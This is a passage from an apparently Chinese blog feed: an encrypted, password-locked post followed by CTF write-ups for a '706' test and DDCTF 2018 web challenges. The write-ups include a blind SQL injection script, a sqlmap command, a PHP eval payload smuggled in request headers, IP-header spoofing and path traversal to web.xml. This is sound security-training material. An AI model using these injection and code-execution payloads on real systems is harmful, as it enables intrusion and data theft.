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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
showMessage("嘻嘻嘻，密码不对哦~", 5000);};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2018 706 writeup]]></title>
      <url>/2018/07/09/2018-706-wp/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p>
<a id="more"></a>
<h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p>
<h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p>
<h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p>
<h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p>
<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p>
<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p>
<h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">	flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">	paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">	flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">	key1=<span class="string">"do_you_know_des3"</span></div><div class="line">	obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">	s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">	key2=<span class="string">"and_you_know_aes"</span></div><div class="line">	iv=md5(key2).digest()</div><div class="line">	obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">	s2=obj2.encrypt(s1)</div><div class="line">	<span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">		f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">	s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line">	</div><div class="line">	key2=<span class="string">"and_you_know_aes"</span></div><div class="line">	iv=md5(key2).digest()</div><div class="line">	obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">	s2=obj2.decrypt(s1)</div><div class="line">	</div><div class="line">	</div><div class="line">	key1=<span class="string">"do_you_know_des3"</span></div><div class="line">	obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">	flag=obj1.decrypt(s2)</div><div class="line">	</div><div class="line">	<span class="keyword">print</span> flag</div><div class="line">		</div><div class="line">		</div><div class="line">decrypt()</div></pre></td></tr></table></figure>
<h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p>
<h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p>
<p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p>
<p>payload为<code>eval(next(apache_request_headers()));</code></p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DDCTF-2018  WEB WRITEUP]]></title>
      <url>/2018/04/19/ddctf-2018/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p>
<a id="more"></a>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title="">
<p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p>
<p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p>
<img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title="">
<p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">		id = <span class="string">""</span></div><div class="line">		title = <span class="string">""</span></div><div class="line">		date = <span class="string">""</span></div><div class="line">		author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line">		<span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">		proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">		data = &#123; <span class="string">"id"</span>:id,</div><div class="line">		<span class="string">"title"</span>:title,</div><div class="line">		<span class="string">"author"</span>:author,</div><div class="line">		<span class="string">"data"</span>:date,</div><div class="line">		<span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">		t = str(int(time.time()))</div><div class="line"></div><div class="line">		str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">		sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">		ip = <span class="string">'123.232.23.245'</span></div><div class="line">							</div><div class="line">		headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line">		<span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line">		<span class="string">'X-Remote-IP'</span>: ip,</div><div class="line">		<span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line">		<span class="string">'X-Client-IP'</span>: ip,</div><div class="line">		<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line">		<span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">			s += chr(i)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	<span class="comment"># print str0</span></div></pre></td></tr></table></figure>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p>
<p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p>
<p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p>
<p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p>
<p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p>
<p>在<code>web.xml</code>中发现该<code>class</code>文件</p>
<img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title="">
<p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p>
<img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title="">
<p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p>
<img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title="">
<p>回到首页，发现<code>email</code>。。。</p>
<img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title="">
<p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) <span class="keyword">throws</span> Exception &#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">try</span>&#123;</div><div class="line">		KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">		FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">		keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line">		</div><div class="line">		PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">		System.out.println(key);</div><div class="line">		Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">		cipher.init(<span class="number">2</span>, key); </div><div class="line">		</div><div class="line">		<span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line">		</div><div class="line">		</div><div class="line">		<span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line">		</div><div class="line">		</div><div class="line">		System.out.println(byte2hex(doFinal));</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">catch</span>(Exception e)</div><div class="line">		&#123;</div><div class="line">			System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p>
<img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title="">
<p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p>
<img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title="">
<p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p>
<img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title="">
<p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p>
<img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title="">
